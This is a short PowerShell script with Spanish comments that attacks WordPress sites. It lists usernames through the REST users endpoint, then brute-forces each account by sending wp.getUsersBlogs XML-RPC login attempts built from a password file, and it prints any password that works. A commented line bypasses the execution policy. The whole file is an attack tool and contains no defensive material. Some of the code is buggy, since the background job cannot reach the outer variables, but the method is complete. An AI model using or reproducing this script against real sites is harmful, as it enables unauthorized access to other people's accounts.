#Bypass de ejecución de script solo para el proceso actual
#Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

#obtener usuarios
param ($url, $passwordf)
if($url -eq $null -or $passwordf -eq $null)
{
    Write-Host "Vacias"
    exit
}
$respuesta= Invoke-WebRequest -Uri "$($url)/wp-json/wp/v2/users"

$usuarios = $respuesta | ConvertFrom-Json
$usuarios = $usuarios.slug


#Fuerza bruta
foreach($usuario in $usuarios)
{
    $hilo = Start-Job -ScriptBlock { foreach($contra in Get-Content $passwordf)
    {
        Write-Host "$($usuario):$($contra)"
        $cuerpo=
        "
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>$($usuario)</value></param>
                <param><value>$($contra)</value></param>
            </params>
        </methodCall>
        "
        $respuesta= Invoke-WebRequest -Uri "$($url)/xmlrpc.php" -Method POST -Body $cuerpo
        if(-not $respuesta.Content.Contains("Incorrectos"))
        {
            Write-Host "la clave es: "$contra
            exit 0
        }
    }
    }
    Receive-Job $hilo
}